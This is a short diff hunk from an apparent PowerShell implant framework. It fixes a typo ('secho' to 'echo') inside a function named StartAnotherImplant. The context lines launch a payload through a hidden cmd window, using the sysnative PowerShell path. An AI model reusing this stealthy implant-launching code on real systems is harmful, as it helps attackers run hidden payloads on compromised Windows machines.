@@ -41,7 +41,7 @@ Function StartAnotherImplant {
             echo "Start-Process Upgrade via CMD"
             start-process -windowstyle hidden cmd -args "/c `"$env:windir\sysnative\windowspowershell\v1.0\$payload`""
         } else {
-            secho "Start-Process via CMD"
+            echo "Start-Process via CMD"
             start-process -windowstyle hidden cmd -args "/c $payload"
         }
     }
